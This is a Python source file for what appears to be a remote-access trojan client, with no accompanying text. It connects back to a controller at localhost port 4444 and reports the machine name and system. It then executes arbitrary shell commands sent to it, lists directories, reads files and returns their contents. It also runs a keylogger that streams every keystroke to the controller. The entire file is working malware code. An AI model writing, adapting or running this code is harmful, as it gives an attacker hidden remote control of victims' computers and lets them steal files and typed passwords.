import socket, os, subprocess, pathlib, platform, logging
from threading import Thread
from pynput.keyboard import Key, Listener

received = b''
currentPath = os.getcwd()

keylogRunning = False

def on_press(key):
	global kS
	if key == Key.esc:
		return False
	send = kS.send(str(key).encode('utf8'))
	

def keylogger(kPort):
	global kS
	global host
	global keylogRunning

	if keylogRunning:
		return
	else:
		print("Starting Keylogger")
	
	
	kNotConnected = True
	while kNotConnected:
		kS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			kS.connect((host,kPort))
			kNotConnected = False
		except:
			kNotConnected = True

	with Listener(on_press=on_press) as listener:
		listener.join()
		keylogRunning = True

def checkCom(command):
	global received
	if received[0:len(command) + 1].lower() == (command + " ").lower():
		received = received[len(command) + 1:]
		return True
	elif received[0:len(command)].lower() == command.lower() and len(received) == len(command):
		received = ''
		return True
	else:
		return False

def runShell(command):
	logging.info("Running Command: " + command)
	proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc2.stdout.read() + proc2.stderr.read()
	return stdout_value

def receive():
	global received
	global currentPath
	received = s.recv(1024).decode('utf8')
	
	if checkCom('quit'):
		s.close()

	elif checkCom('shell'):
		proc2 = subprocess.Popen(received, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc2.stdout.read() + proc2.stderr.read()
		args = stdout_value

	elif checkCom('shellThread'):
		process = Thread(target=runShell, args=[received])
		process.start()
		process.join()
		args = 'Ran Command'

	elif checkCom('cwd'):
		args = currentPath

	elif checkCom('ls'):
		currentPath = os.getcwd()
		currentDirectory = pathlib.Path(currentPath)
		files = []
		files.append('<DIR> .')
		files.append('<DIR> ..')
		for file in currentDirectory.iterdir():
			fileName = str(file).split('\\')[-1]
			if os.path.isdir(str(file)):
				files.append('<DIR> ' + fileName)
			else:
				files.append('      ' + fileName)
		args = '\n'.join(files)

	elif checkCom('cd'):
		if os.path.isdir(received):
			os.chdir(received)
			currentPath = os.getcwd()
			args = 'currentPath:' + currentPath
		elif received == '~':
			os.chdir(os.path.expanduser('~'))
			currentPath = os.getcwd()
			args = 'currentPath:' + currentPath
		else:
			args = '"' + received + '" Is not a Directory'

	elif checkCom('cat'):
		f = open(received)
		args = f.read()
		f.close()

	elif checkCom('keylog'):
		if received:
			process = Thread(target=keylogger, args=[int(received)])
			process.start()
			#process.join()
			args = 'Starting Keylogger'
		else:
			args = 'Provide Valid Port'

	else:
		args = 'Command: "' + received + '" Is Not Recognised'

	send(args)

def send(args):
	global received
	if type(args) == type(''):
		send = s.send(args.encode('utf8'))
	elif type(args) == type(b''):
		send = s.send(args)
	else:
		send = s.send(str(args).encode('utf8'))
	received = b''
	receive()

def connect():
	notConnected = True
	while notConnected:
		os.system('cls')
		global host
		global port
		global s

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		port = 4444
		host = 'localhost'

		try:
			print('[!] Trying To Connect To %s:%s'%(host, port))
			s.connect((host,port))
			print('[*] Connection Established')
			s.send((str(os.environ['COMPUTERNAME']) + ',' + platform.system() + ',' + currentPath).encode('utf8'))
			notConnected = False
		except Exception as e:
			print('Could Not Connect: ', e)

connect()
receive()
s.close()